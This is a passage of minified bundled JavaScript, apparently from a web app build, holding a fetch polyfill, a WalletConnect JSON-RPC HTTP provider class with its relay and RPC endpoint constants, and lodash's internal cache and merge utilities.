0,value:O}}};return c.iterable&&(_[Symbol.iterator]=function(){return _}),_}function g(v){this.map={},v instanceof g?v.forEach(function(_,O){this.append(O,_)},this):Array.isArray(v)?v.forEach(function(_){if(_.length!=2)throw new TypeError("Headers constructor: expected name/value pair to be length 2, found"+_.length);this.append(_[0],_[1])},this):v&&Object.getOwnPropertyNames(v).forEach(function(_){this.append(_,v[_])},this)}g.prototype.append=function(v,_){v=h(v),_=f(_);var O=this.map[v];this.map[v]=O?O+", "+_:_},g.prototype.delete=function(v){delete this.map[h(v)]},g.prototype.get=function(v){return v=h(v),this.has(v)?this.map[v]:null},g.prototype.has=function(v){return this.map.hasOwnProperty(h(v))},g.prototype.set=function(v,_){this.map[h(v)]=f(_)},g.prototype.forEach=function(v,_){for(var O in this.map)this.map.hasOwnProperty(O)&&v.call(_,this.map[O],O,this)},g.prototype.keys=function(){var v=[];return this.forEach(function(_,O){v.push(O)}),p(v)},g.prototype.values=function(){var v=[];return this.forEach(function(_){v.push(_)}),p(v)},g.prototype.entries=function(){var v=[];return this.forEach(function(_,O){v.push([O,_])}),p(v)},c.iterable&&(g.prototype[Symbol.iterator]=g.prototype.entries);function w(v){if(!v._noBody){if(v.bodyUsed)return Promise.reject(new TypeError("Already read"));v.bodyUsed=!0}}function m(v){return new Promise(function(_,O){v.onload=function(){_(v.result)},v.onerror=function(){O(v.error)}})}function x(v){var _=new FileReader,O=m(_);return _.readAsArrayBuffer(v),O}function S(v){var _=new FileReader,O=m(_),D=/charset=([A-Za-z0-9_-]+)/.exec(v.type),R=D?D[1]:"utf-8";return _.readAsText(v,R),O}function T(v){for(var _=new Uint8Array(v),O=new Array(_.length),D=0;D<_.length;D++)O[D]=String.fromCharCode(_[D]);return O.join("")}function k(v){if(v.slice)return v.slice(0);var _=new Uint8Array(v.byteLength);return _.set(new Uint8Array(v)),_.buffer}function I(){return this.bodyUsed=!1,this._initBody=function(v){this.bodyUsed=this.bodyUsed,this._bodyInit=v,v?typeof v=="string"?this._bodyText=v:c.blob&&Blob.prototype.isPrototypeOf(v)?this._bodyBlob=v:c.formData&&FormData.prototype.isPrototypeOf(v)?this._bodyFormData=v:c.searchParams&&URLSearchParams.prototype.isPrototypeOf(v)?this._bodyText=v.toString():c.arrayBuffer&&c.blob&&l(v)?(this._bodyArrayBuffer=k(v.buffer),this._bodyInit=new Blob([this._bodyArrayBuffer])):c.arrayBuffer&&(ArrayBuffer.prototype.isPrototypeOf(v)||d(v))?this._bodyArrayBuffer=k(v):this._bodyText=v=Object.prototype.toString.call(v):(this._noBody=!0,this._bodyText=""),this.headers.get("content-type")||(typeof v=="string"?this.headers.set("content-type","text/plain;charset=UTF-8"):this._bodyBlob&&this._bodyBlob.type?this.headers.set("content-type",this._bodyBlob.type):c.searchParams&&URLSearchParams.prototype.isPrototypeOf(v)&&this.headers.set("content-type","application/x-www-form-urlencoded;charset=UTF-8"))},c.blob&&(this.blob=function(){var v=w(this);if(v)return v;if(this._bodyBlob)return Promise.resolve(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve(new Blob([this._bodyArrayBuffer]));if(this._bodyFormData)throw new Error("could not read FormData body as blob");return Promise.resolve(new Blob([this._bodyText]))}),this.arrayBuffer=function(){if(this._bodyArrayBuffer){var v=w(this);return v||(ArrayBuffer.isView(this._bodyArrayBuffer)?Promise.resolve(this._bodyArrayBuffer.buffer.slice(this._bodyArrayBuffer.byteOffset,this._bodyArrayBuffer.byteOffset+this._bodyArrayBuffer.byteLength)):Promise.resolve(this._bodyArrayBuffer))}else{if(c.blob)return this.blob().then(x);throw new Error("could not read as ArrayBuffer")}},this.text=function(){var v=w(this);if(v)return v;if(this._bodyBlob)return S(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve(T(this._bodyArrayBuffer));if(this._bodyFormData)throw new Error("could not read FormData body as text");return Promise.resolve(this._bodyText)},c.formData&&(this.formData=function(){return this.text().then(L)}),this.json=function(){return this.text().then(JSON.parse)},this}var E=["CONNECT","DELETE","GET","HEAD","OPTIONS","PATCH","POST","PUT","TRACE"];function C(v){var _=v.toUpperCase();return E.indexOf(_)>-1?_:v}function N(v,_){if(!(this instanceof N))throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');_=_||{};var O=_.body;if(v instanceof N){if(v.bodyUsed)throw new TypeError("Already read");this.url=v.url,this.credentials=v.credentials,_.headers||(this.headers=new g(v.headers)),this.method=v.method,this.mode=v.mode,this.signal=v.signal,!O&&v._bodyInit!=null&&(O=v._bodyInit,v.bodyUsed=!0)}else this.url=String(v);if(this.credentials=_.credentials||this.credentials||"same-origin",(_.headers||!this.headers)&&(this.headers=new g(_.headers)),this.method=C(_.method||this.method||"GET"),this.mode=_.mode||this.mode||null,this.signal=_.signal||this.signal||function(){if("AbortController"in a){var P=new AbortController;return P.signal}}(),this.referrer=null,(this.method==="GET"||this.method==="HEAD")&&O)throw new TypeError("Body not allowed for GET or HEAD requests");if(this._initBody(O),(this.method==="GET"||this.method==="HEAD")&&(_.cache==="no-store"||_.cache==="no-cache")){var D=/([?&])_=[^&]*/;if(D.test(this.url))this.url=this.url.replace(D,"$1_="+new Date().getTime());else{var R=/\?/;this.url+=(R.test(this.url)?"&":"?")+"_="+new Date().getTime()}}}N.prototype.clone=function(){return new N(this,{body:this._bodyInit})};function L(v){var _=new FormData;return v.trim().split("&").forEach(function(O){if(O){var D=O.split("="),R=D.shift().replace(/\+/g," "),P=D.join("=").replace(/\+/g," ");_.append(decodeURIComponent(R),decodeURIComponent(P))}}),_}function $(v){var _=new g,O=v.replace(/\r?\n[\t ]+/g," ");return O.split("\r").map(function(D){return D.indexOf(`
`)===0?D.substr(1,D.length):D}).forEach(function(D){var R=D.split(":"),P=R.shift().trim();if(P){var B=R.join(":").trim();try{_.append(P,B)}catch(M){console.warn("Response "+M.message)}}}),_}I.call(N.prototype);function y(v,_){if(!(this instanceof y))throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');if(_||(_={}),this.type="default",this.status=_.status===void 0?200:_.status,this.status<200||this.status>599)throw new RangeError("Failed to construct 'Response': The status provided (0) is outside the range [200, 599].");this.ok=this.status>=200&&this.status<300,this.statusText=_.statusText===void 0?"":""+_.statusText,this.headers=new g(_.headers),this.url=_.url||"",this._initBody(v)}I.call(y.prototype),y.prototype.clone=function(){return new y(this._bodyInit,{status:this.status,statusText:this.statusText,headers:new g(this.headers),url:this.url})},y.error=function(){var v=new y(null,{status:200,statusText:""});return v.ok=!1,v.status=0,v.type="error",v};var A=[301,302,303,307,308];y.redirect=function(v,_){if(A.indexOf(_)===-1)throw new RangeError("Invalid status code");return new y(null,{status:_,headers:{location:v}})},o.DOMException=a.DOMException;try{new o.DOMException}catch{o.DOMException=function(_,O){this.message=_,this.name=O;var D=Error(_);this.stack=D.stack},o.DOMException.prototype=Object.create(Error.prototype),o.DOMException.prototype.constructor=o.DOMException}function b(v,_){return new Promise(function(O,D){var R=new N(v,_);if(R.signal&&R.signal.aborted)return D(new o.DOMException("Aborted","AbortError"));var P=new XMLHttpRequest;function B(){P.abort()}P.onload=function(){var K={statusText:P.statusText,headers:$(P.getAllResponseHeaders()||"")};R.url.indexOf("file://")===0&&(P.status<200||P.status>599)?K.status=200:K.status=P.status,K.url="responseURL"in P?P.responseURL:K.headers.get("X-Request-URL");var q="response"in P?P.response:P.responseText;setTimeout(function(){O(new y(q,K))},0)},P.onerror=function(){setTimeout(function(){D(new TypeError("Network request failed"))},0)},P.ontimeout=function(){setTimeout(function(){D(new TypeError("Network request timed out"))},0)},P.onabort=function(){setTimeout(function(){D(new o.DOMException("Aborted","AbortError"))},0)};function M(K){try{return K===""&&a.location.href?a.location.href:K}catch{return K}}if(P.open(R.method,M(R.url),!0),R.credentials==="include"?P.withCredentials=!0:R.credentials==="omit"&&(P.withCredentials=!1),"responseType"in P&&(c.blob?P.responseType="blob":c.arrayBuffer&&(P.responseType="arraybuffer")),_&&typeof _.headers=="object"&&!(_.headers instanceof g||a.Headers&&_.headers instanceof a.Headers)){var W=[];Object.getOwnPropertyNames(_.headers).forEach(function(K){W.push(h(K)),P.setRequestHeader(K,f(_.headers[K]))}),R.headers.forEach(function(K,q){W.indexOf(q)===-1&&P.setRequestHeader(q,K)})}else R.headers.forEach(function(K,q){P.setRequestHeader(q,K)});R.signal&&(R.signal.addEventListener("abort",B),P.onreadystatechange=function(){P.readyState===4&&R.signal.removeEventListener("abort",B)}),P.send(typeof R._bodyInit>"u"?null:R._bodyInit)})}return b.polyfill=!0,a.fetch||(a.fetch=b,a.Headers=g,a.Request=N,a.Response=y),o.Headers=g,o.Request=N,o.Response=y,o.fetch=b,Object.defineProperty(o,"__esModule",{value:!0}),o})({})})(i),i.fetch.ponyfill=!0,delete i.fetch.polyfill;var n=t.fetch?t:i;e=n.fetch,e.default=n.fetch,e.fetch=n.fetch,e.Headers=n.Headers,e.Request=n.Request,e.Response=n.Response,r.exports=e}(X6,X6.exports)),X6.exports}var qxe=Fxe();const iF=Ss(qxe);var zxe=Object.defineProperty,Wxe=Object.defineProperties,Hxe=Object.getOwnPropertyDescriptors,nF=Object.getOwnPropertySymbols,Vxe=Object.prototype.hasOwnProperty,Kxe=Object.prototype.propertyIsEnumerable,sF=(r,e,t)=>e in r?zxe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,oF=(r,e)=>{for(var t in e||(e={}))Vxe.call(e,t)&&sF(r,t,e[t]);if(nF)for(var t of nF(e))Kxe.call(e,t)&&sF(r,t,e[t]);return r},aF=(r,e)=>Wxe(r,Hxe(e));const Gxe={Accept:"application/json","Content-Type":"application/json"},Zxe="POST",cF={headers:Gxe,method:Zxe},lF=10;let li=class{constructor(e,t=!1){if(this.url=e,this.disableProviderPing=t,this.events=new en.EventEmitter,this.isAvailable=!1,this.registering=!1,!Cj(e))throw new Error(`Provided URL is not compatible with HTTP connection: ${e}`);this.url=e,this.disableProviderPing=t}get connected(){return this.isAvailable}get connecting(){return this.registering}on(e,t){this.events.on(e,t)}once(e,t){this.events.once(e,t)}off(e,t){this.events.off(e,t)}removeListener(e,t){this.events.removeListener(e,t)}async open(e=this.url){await this.register(e)}async close(){if(!this.isAvailable)throw new Error("Connection already closed");this.onClose()}async send(e){this.isAvailable||await this.register();try{const t=mu(e),i=await(await iF(this.url,aF(oF({},cF),{body:t}))).json();this.onPayload({data:i})}catch(t){this.onError(e.id,t)}}async register(e=this.url){if(!Cj(e))throw new Error(`Provided URL is not compatible with HTTP connection: ${e}`);if(this.registering){const t=this.events.getMaxListeners();return(this.events.listenerCount("register_error")>=t||this.events.listenerCount("open")>=t)&&this.events.setMaxListeners(t+1),new Promise((i,n)=>{this.events.once("register_error",s=>{this.resetMaxListeners(),n(s)}),this.events.once("open",()=>{if(this.resetMaxListeners(),typeof this.isAvailable>"u")return n(new Error("HTTP connection is missing or invalid"));i()})})}this.url=e,this.registering=!0;try{if(!this.disableProviderPing){const t=mu({id:1,jsonrpc:"2.0",method:"test",params:[]});await iF(e,aF(oF({},cF),{body:t}))}this.onOpen()}catch(t){const i=this.parseError(t);throw this.events.emit("register_error",i),this.onClose(),i}}onOpen(){this.isAvailable=!0,this.registering=!1,this.events.emit("open")}onClose(){this.isAvailable=!1,this.registering=!1,this.events.emit("close")}onPayload(e){if(typeof e.data>"u")return;const t=typeof e.data=="string"?gu(e.data):e.data;this.events.emit("payload",t)}onError(e,t){const i=this.parseError(t),n=i.message||i.toString(),s=Ap(e,n);this.events.emit("payload",s)}parseError(e,t=this.url){return aX(e,t,"HTTP")}resetMaxListeners(){this.events.getMaxListeners()>lF&&this.events.setMaxListeners(lF)}};const uF="error",Yxe="wss://relay.walletconnect.org",Jxe="wc",Qxe="universal_provider",dF=`${Jxe}@2:${Qxe}:`,PX="https://rpc.walletconnect.org/v1/",Rm="generic",Xxe=`${PX}bundler`,vl={DEFAULT_CHAIN_CHANGED:"default_chain_changed"};var e8=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function eCe(){this.__data__=[],this.size=0}var tCe=eCe;function rCe(r,e){return r===e||r!==r&&e!==e}var dC=rCe,iCe=dC;function nCe(r,e){for(var t=r.length;t--;)if(iCe(r[t][0],e))return t;return-1}var hC=nCe,sCe=hC,oCe=Array.prototype,aCe=oCe.splice;function cCe(r){var e=this.__data__,t=sCe(e,r);if(t<0)return!1;var i=e.length-1;return t==i?e.pop():aCe.call(e,t,1),--this.size,!0}var lCe=cCe,uCe=hC;function dCe(r){var e=this.__data__,t=uCe(e,r);return t<0?void 0:e[t][1]}var hCe=dCe,fCe=hC;function pCe(r){return fCe(this.__data__,r)>-1}var gCe=pCe,mCe=hC;function wCe(r,e){var t=this.__data__,i=mCe(t,r);return i<0?(++this.size,t.push([r,e])):t[i][1]=e,this}var bCe=wCe,vCe=tCe,yCe=lCe,xCe=hCe,CCe=gCe,ECe=bCe;function Om(r){var e=-1,t=r==null?0:r.length;for(this.clear();++e<t;){var i=r[e];this.set(i[0],i[1])}}Om.prototype.clear=vCe,Om.prototype.delete=yCe,Om.prototype.get=xCe,Om.prototype.has=CCe,Om.prototype.set=ECe;var fC=Om,_Ce=fC;function SCe(){this.__data__=new _Ce,this.size=0}var ACe=SCe;function ICe(r){var e=this.__data__,t=e.delete(r);return this.size=e.size,t}var TCe=ICe;function kCe(r){return this.__data__.get(r)}var NCe=kCe;function PCe(r){return this.__data__.has(r)}var $Ce=PCe,RCe=typeof e8=="object"&&e8&&e8.Object===Object&&e8,$X=RCe,OCe=$X,BCe=typeof self=="object"&&self&&self.Object===Object&&self,MCe=OCe||BCe||Function("return this")(),I3=MCe,DCe=I3,LCe=DCe.Symbol,RX=LCe,hF=RX,OX=Object.prototype,UCe=OX.hasOwnProperty,jCe=OX.toString,_b=hF?hF.toStringTag:void 0;function FCe(r){var e=UCe.call(r,_b),t=r[_b];try{r[_b]=void 0;var i=!0}catch{}var n=jCe.call(r);return i&&(e?r[_b]=t:delete r[_b]),n}var qCe=FCe,zCe=Object.prototype,WCe=zCe.toString;function HCe(r){return WCe.call(r)}var VCe=HCe,fF=RX,KCe=qCe,GCe=VCe,ZCe="[object Null]",YCe="[object Undefined]",pF=fF?fF.toStringTag:void 0;function JCe(r){return r==null?r===void 0?YCe:ZCe:pF&&pF in Object(r)?KCe(r):GCe(r)}var pC=JCe;function QCe(r){var e=typeof r;return r!=null&&(e=="object"||e=="function")}var o2=QCe,XCe=pC,eEe=o2,tEe="[object AsyncFunction]",rEe="[object Function]",iEe="[object GeneratorFunction]",nEe="[object Proxy]";function sEe(r){if(!eEe(r))return!1;var e=XCe(r);return e==rEe||e==iEe||e==tEe||e==nEe}var xR=sEe,oEe=I3,aEe=oEe["__core-js_shared__"],cEe=aEe,JS=cEe,gF=function(){var r=/[^.]+$/.exec(JS&&JS.keys&&JS.keys.IE_PROTO||"");return r?"Symbol(src)_1."+r:""}();function lEe(r){return!!gF&&gF in r}var uEe=lEe,dEe=Function.prototype,hEe=dEe.toString;function fEe(r){if(r!=null){try{return hEe.call(r)}catch{}try{return r+""}catch{}}return""}var pEe=fEe,gEe=xR,mEe=uEe,wEe=o2,bEe=pEe,vEe=/[\\^$.*+?()[\]{}|]/g,yEe=/^\[object .+?Constructor\]$/,xEe=Function.prototype,CEe=Object.prototype,EEe=xEe.toString,_Ee=CEe.hasOwnProperty,SEe=RegExp("^"+EEe.call(_Ee).replace(vEe,"\\$&").replace(/hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g,"$1.*?")+"$");function AEe(r){if(!wEe(r)||mEe(r))return!1;var e=gEe(r)?SEe:yEe;return e.test(bEe(r))}var IEe=AEe;function TEe(r,e){return r?.[e]}var kEe=TEe,NEe=IEe,PEe=kEe;function $Ee(r,e){var t=PEe(r,e);return NEe(t)?t:void 0}var CR=$Ee,REe=CR,OEe=I3,BEe=REe(OEe,"Map"),BX=BEe,MEe=CR,DEe=MEe(Object,"create"),gC=DEe,mF=gC;function LEe(){this.__data__=mF?mF(null):{},this.size=0}var UEe=LEe;function jEe(r){var e=this.has(r)&&delete this.__data__[r];return this.size-=e?1:0,e}var FEe=jEe,qEe=gC,zEe="__lodash_hash_undefined__",WEe=Object.prototype,HEe=WEe.hasOwnProperty;function VEe(r){var e=this.__data__;if(qEe){var t=e[r];return t===zEe?void 0:t}return HEe.call(e,r)?e[r]:void 0}var KEe=VEe,GEe=gC,ZEe=Object.prototype,YEe=ZEe.hasOwnProperty;function JEe(r){var e=this.__data__;return GEe?e[r]!==void 0:YEe.call(e,r)}var QEe=JEe,XEe=gC,e_e="__lodash_hash_undefined__";function t_e(r,e){var t=this.__data__;return this.size+=this.has(r)?0:1,t[r]=XEe&&e===void 0?e_e:e,this}var r_e=t_e,i_e=UEe,n_e=FEe,s_e=KEe,o_e=QEe,a_e=r_e;function Bm(r){var e=-1,t=r==null?0:r.length;for(this.clear();++e<t;){var i=r[e];this.set(i[0],i[1])}}Bm.prototype.clear=i_e,Bm.prototype.delete=n_e,Bm.prototype.get=s_e,Bm.prototype.has=o_e,Bm.prototype.set=a_e;var c_e=Bm,wF=c_e,l_e=fC,u_e=BX;function d_e(){this.size=0,this.__data__={hash:new wF,map:new(u_e||l_e),string:new wF}}var h_e=d_e;function f_e(r){var e=typeof r;return e=="string"||e=="number"||e=="symbol"||e=="boolean"?r!=="__proto__":r===null}var p_e=f_e,g_e=p_e;function m_e(r,e){var t=r.__data__;return g_e(e)?t[typeof e=="string"?"string":"hash"]:t.map}var mC=m_e,w_e=mC;function b_e(r){var e=w_e(this,r).delete(r);return this.size-=e?1:0,e}var v_e=b_e,y_e=mC;function x_e(r){return y_e(this,r).get(r)}var C_e=x_e,E_e=mC;function __e(r){return E_e(this,r).has(r)}var S_e=__e,A_e=mC;function I_e(r,e){var t=A_e(this,r),i=t.size;return t.set(r,e),this.size+=t.size==i?0:1,this}var T_e=I_e,k_e=h_e,N_e=v_e,P_e=C_e,$_e=S_e,R_e=T_e;function Mm(r){var e=-1,t=r==null?0:r.length;for(this.clear();++e<t;){var i=r[e];this.set(i[0],i[1])}}Mm.prototype.clear=k_e,Mm.prototype.delete=N_e,Mm.prototype.get=P_e,Mm.prototype.has=$_e,Mm.prototype.set=R_e;var O_e=Mm,B_e=fC,M_e=BX,D_e=O_e,L_e=200;function U_e(r,e){var t=this.__data__;if(t instanceof B_e){var i=t.__data__;if(!M_e||i.length<L_e-1)return i.push([r,e]),this.size=++t.size,this;t=this.__data__=new D_e(i)}return t.set(r,e),this.size=t.size,this}var j_e=U_e,F_e=fC,q_e=ACe,z_e=TCe,W_e=NCe,H_e=$Ce,V_e=j_e;function Dm(r){var e=this.__data__=new F_e(r);this.size=e.size}Dm.prototype.clear=q_e,Dm.prototype.delete=z_e,Dm.prototype.get=W_e,Dm.prototype.has=H_e,Dm.prototype.set=V_e;var K_e=Dm,G_e=CR,Z_e=function(){try{var r=G_e(Object,"defineProperty");return r({},"",{}),r}catch{}}(),MX=Z_e,bF=MX;function Y_e(r,e,t){e=="__proto__"&&bF?bF(r,e,{configurable:!0,enumerable:!0,value:t,writable:!0}):r[e]=t}var ER=Y_e,J_e=ER,Q_e=dC;function X_e(r,e,t){(t!==void 0&&!Q_e(r[e],t)||t===void 0&&!(e in r))&&J_e(r,e,t)}var DX=X_e;function eSe(r){return function(e,t,i){for(var n=-1,s=Object(e),o=i(e),a=o.length;a--;){var c=o[r?a:++n];if(t(s[c],c,s)===!1)break}return e}}var tSe=eSe,rSe=tSe,iSe=rSe(),nSe=iSe,Bk={exports:{}};(function(r,e){var t=I3,i=e&&!e.nodeType&&e,n=i&&!0&&r&&!r.nodeType&&r,s=n&&n.exports===i,o=s?t.Buffer:void 0,a=o?o.allocUnsafe:void 0;function c(l,u){if(u)return l.slice();var d=l.length,h=a?a(d):new l.constructor(d);return l.copy(h),h}r.exports=c})(Bk,Bk.exports);var sSe=I3,oSe=sSe.Uint8Array,aSe=oSe,vF=aSe;function cSe(r){var e=new r.constructor(r.byteLength);return new vF(e).set(new vF(r)),e}var lSe=cSe,uSe=lSe;function dSe(r,e){var t=e?uSe(r.buffer):r.buffer;return new r.constructor(t,r.byteOffset,r.length)}var hSe=dSe;function fSe(r,e){var t=-1,i=r.length;for(e||(e=Array(i));++t<i;)e[t]=r[t];return e}var pSe=fSe,gSe=o2,yF=Object.create,mSe=function(){function r(){}return function(e){if(!gSe(e))return{};if(yF)return yF(e);r.prototype=e;var t=new r;return r.prototype=void 0,t}}(),wSe=mSe;function bSe(r,e){return function(t){return r(e(t))}}var vSe=bSe,ySe=vSe,xSe=ySe(Object.getPrototypeOf,Object),LX=xSe,CSe=Object.prototype;function ESe(r){var e=r&&r.constructor,t=typeof e=="function"&&e.prototype||CSe;return r===t}var UX=ESe,_Se=wSe,SSe=LX,ASe=UX;function ISe(r){return typeof r.constructor=="function"&&!ASe(r)?_Se(SSe(r)):{}}var TSe=ISe;function kSe(r){return r!=null&&typeof r=="object"}var w4=kSe,NSe=pC,PSe=w4,$Se="[object Arguments]";function RSe(r){return PSe(r)&&NSe(r)==$Se}var OSe=RSe,xF=OSe,BSe=w4,jX=Object.prototype,MSe=jX.hasOwnProperty,DSe=jX.propertyIsEnumerable,LSe=xF(function(){return arguments}())?xF:function(r){return BSe(r)&&MSe.call(r,"callee")&&!DSe.call(r,"callee")},FX=LSe,USe=Array.isArray,qX=USe,jSe=9007199254740991;function FSe(r){return typeof r=="number"&&r>-1&&r%1==0&&r<=jSe}var zX=FSe,qSe=xR,zSe=zX;function WSe(r){return r!=null&&zSe(r.length)&&!qSe(r)}var _R=WSe,HSe=_R,VSe=w4;function KSe(r){return VSe(r)&&HSe(r)}var GSe=KSe,d7={exports:{}};function ZSe(){return!1}var YSe=ZSe;(function(r,e){var t=I3,i=YSe,n=e&&!e.nodeType&&e,s=n&&!0&&r&&!r.nodeType&&r,o=s&&s.exports===n,a=o?t.Buffer:void 0,c=a?a.isBuffer:void 0,l=c||i;r.exports=l})(d7,d7.exports);var JSe=pC,QSe=LX,XSe=w4,eAe="[object Object]",tAe=Function.prototype,rAe=Object.prototype,WX=tAe.toString,iAe=rAe.hasOwnProperty,nAe=WX.call(Object);function sAe(r){if(!XSe(r)||JSe(r)!=eAe)return!1;var e=QSe(r);if(e===null)return!0;var t=iAe.call(e,"constructor")&&e.constructor;return typeof t=="function"&&t instanceof t&&WX.call(t)==nAe}var oAe=sAe,aAe=pC,cAe=zX,lAe=w4,uAe="[object Arguments]",dAe="[object Array]",hAe="[object Boolean]",fAe="[object Date]",pAe="[object Error]",gAe="[object Function]",mAe="[object Map]",wAe="[object Number]",bAe="[object Object]",vAe="[object RegExp]",yAe="[object Set]",xAe="[object String]",CAe="[object WeakMap]",EAe="[object ArrayBuffer]",_Ae="[object DataView]",SAe="[object Float32Array]",AAe="[object Float64Array]",IAe="[object Int8Array]",TAe="[object Int16Array]",kAe="[object Int32Array]",NAe="[object Uint8Array]",PAe="[object Uint8ClampedArray]",$Ae="[object Uint16Array]",RAe="[object Uint32Array]",hn={};hn[SAe]=hn[AAe]=hn[IAe]=hn[TAe]=hn[kAe]=hn[NAe]=hn[PAe]=hn[$Ae]=hn[RAe]=!0,hn[uAe]=hn[dAe]=hn[EAe]=hn[hAe]=hn[_Ae]=hn[fAe]=hn[pAe]=hn[gAe]=hn[mAe]=hn[wAe]=hn[bAe]=hn[vAe]=hn[yAe]=hn[xAe]=hn[CAe]=!1;function OAe(r){return lAe(r)&&cAe(r.length)&&!!hn[aAe(r)]}var BAe=OAe;function MAe(r){return function(e){return r(e)}}var DAe=MAe,Mk={exports:{}};(function(r,e){var t=$X,i=e&&!e.nodeType&&e,n=i&&!0&&r&&!r.nodeType&&r,s=n&&n.exports===i,o=s&&t.process,a=function(){try{var c=n&&n.require&&n.require("util").types;return c||o&&o.binding&&o.binding("util")}catch{}}();r.exports=a})(Mk,Mk.exports);var LAe=BAe,UAe=DAe,CF=Mk.exports,EF=CF&&CF.isTypedArray,jAe=EF?UAe(EF):LAe,HX=jAe;function FAe(r,e){if(!(e==="constructor"&&typeof r[e]=="function")&&e!="__proto__")return r[e]}var VX=FAe,qAe=ER,zAe=dC,WAe=Object.prototype,HAe=WAe.hasOwnProperty;function VAe(r,e,t){var i=r[e];(!(HAe.call(r,e)&&zAe(i,t))||t===void 0&&!(e in r))&&qAe(r,e,t)}var KAe=VAe,GAe=KAe,ZAe=ER;function YAe(r,e,t,i){var n=!t;t||(t={});for(var s=-1,o=e.length;++s<o;){var a=e[s],c=i?i(t[a],r[a],a,t,r):void 0;c===void 0&&(c=r[a]),n?ZAe(t,a,c):GAe(t,a,c)}return t}var JAe=YAe;function QAe(r,e){for(var t=-1,i=Array(r);++t<r;)i[t]=e(t);return i}var XAe=QAe,eIe=9007199254740991,tIe=/^(?:0|[1-9]\d*)$/;function rIe(r,e){var t=typeof r;return e=e??eIe,!!e&&(t=="number"||t!="symbol"&&tIe.test(r))&&r>-1&&r%1==0&&r<e}var KX=rIe,iIe=XAe,nIe=FX,sIe=qX,oIe=d7.exports,aIe=KX,cIe=HX,lIe=Object.prototype,uIe=lIe.hasOwnProperty;function dIe(r,e){var t=sIe(r),i=!t&&nIe(r),n=!t&&!i&&oIe(r),s=!t&&!i&&!n&&cIe(r),o=t||i||n||s,a=o?iIe(r.length,String):[],c=a.length;for(var l in r)(e||uIe.call(r,l))&&!(o&&(l=="length"||n&&(l=="offset"||l=="parent")||s&&(l=="buffer"||l=="byteLength"||l=="byteOffset")||aIe(l,c)))&&a.push(l);return a}var hIe=dIe;function fIe(r){var e=[];if(r!=null)for(var t in Object(r))e.push(t);return e}var pIe=fIe,gIe=o2,mIe=UX,wIe=pIe,bIe=Object.prototype,vIe=bIe.hasOwnProperty;function yIe(r){if(!gIe(r))return wIe(r);var e=mIe(r),t=[];for(var i in r)i=="constructor"&&(e||!vIe.call(r,i))||t.push(i);return t}var xIe=yIe,CIe=hIe,EIe=xIe,_Ie=_R;function SIe(r){return _Ie(r)?CIe(r,!0):EIe(r)}var GX=SIe,AIe=JAe,IIe=GX;function TIe(r){return AIe(r,IIe(r))}var kIe=TIe,_F=DX,NIe=Bk.exports,PIe=hSe,$Ie=pSe,RIe=TSe,SF=FX,AF=qX,OIe=GSe,BIe=d7.exports,MIe=xR,DIe=o2,LIe=oAe,UIe=HX,IF=VX,jIe=kIe;function FIe(r,e,t,i,n,s,o){var a=IF(r,t),c=IF(e,t),l=o.get(c);if(l){_F(r,t,l);return}var u=s?s(a,c,t+"",r,e,o):void 0,d=u===void 0;if(d){var h=AF(c),f=!h&&BIe(c),p=!h&&!f&&UIe(c);u=c,h||f||p?AF(a)?u=a:OIe(a)?u=$Ie(a):f?(d=!1,u=NIe(c,!0)):p?(d=!1,u=PIe(c,!0)):u=[]:LIe(c)||SF(c)?(u=a,SF(a)?u=jIe(a):(!DIe(a)||MIe(a))&&(u=RIe(c))):d=!1}d&&(o.set(c,u),n(u,c,i,s,o),o.delete(c)),_F(r,t,u)}var qIe=FIe,zIe=K_e,WIe=DX,HIe=nSe,VIe=qIe,KIe=o2,GIe=GX,ZIe=VX;function ZX(r,e,t,i,n){r!==e&&HIe(e,function(s,o){if(n||(n=new zIe),KIe(s))VIe(r,e,o,t,ZX,i,n);else{var a=i?i(ZIe(r,o),s,o+"",r,e,n):void 0;a===void 0&&(a=s),WIe(r,o,a)}},GIe)}var YIe=ZX;function JIe(r){return r}var YX=JIe;function QIe(r,e,t){switch(t.length){case 0:return r.call(e);case 1:return r.call(e,t[0]);case 2:return r.call(e,t[0],t[1]);case 3:return r.call(e,t[0],t[1],t[2])}return r.apply(e,t)}var XIe=QIe,eTe=XIe,TF=Math.max;function tTe(r,e,t){return e=TF(e===void 0?r.length-1:e,0),function(){for(var i=arguments,n=-1,s=TF(i.length-e,0),o=Array(s);++n<s;)o[n]=i[e+n];n=-1;for(var a=Array(e+1);++n<e;)a[n]=i[n];return a[e]=t(o),eTe(r,this,a)}}var rTe=tTe;function iTe(r){return function(){return r}}var nTe=iTe,sTe=nTe,kF=MX,oTe=YX,aTe=kF?function(r,e){return kF(r,"toString",{configurable:!0,enumerable:!1,value:sTe(e),writable:!0})}:oTe,cTe=aTe,lTe=800,uTe=16,dTe=Date.now;function hTe(r){var e=0,t=0;return function(){var i=dTe(),n=uTe-(i-t);if(t=i,n>0){if(++e>=lTe)return arguments[0]}else e=0;return r.apply(void 0,arguments)}}var fTe=hTe,pTe=cTe,gTe=fTe,mTe=gTe(pTe),wTe=mTe,bTe=YX,vTe=rTe,yTe=wTe;function xTe(r,e){return yTe(vTe(r,e,bTe),r+"")}var CTe=xTe,ETe=dC,_Te=_R,STe=KX,ATe=o2;function ITe(r,e,t){if(!ATe(t))return!1;var i=typeof e;return(i=="number"?_Te(t)&&STe(e,t.length):i=="string"&&e in t)?ETe(t[e],r):!1}var TTe=ITe,kTe=CTe,NTe=TTe;function PTe(r){return kTe(function(e,t){var i=-1,n=t.length,s=n>1?t[n-1]:void 0,o=n>2?t[2]:void 0;for(s=r.length>3&&typeof s=="function"?(n--,s):void 0,o&&NTe(t[0],t[1],o)&&(s=n<3?void 0:s,n=1),e=Object(e);++i<n;){var a=t[i];a&&r(e,a,i,s)}return e})}var $Te=PTe,RTe=YIe,OTe=$Te,BTe=OTe(function(r,e,t){RTe(r,e,t)}),MTe=BTe,DTe=Object.defineProperty,LTe=Object.defineProperties,UTe=Object.getOwnPropertyDescriptors,NF=Object.getOwnPropertySymbols,jTe=Object.prototype.hasOwnProperty,FTe=Object.prototype.propertyIsEnumerable,PF=(r,e,t)=>e in 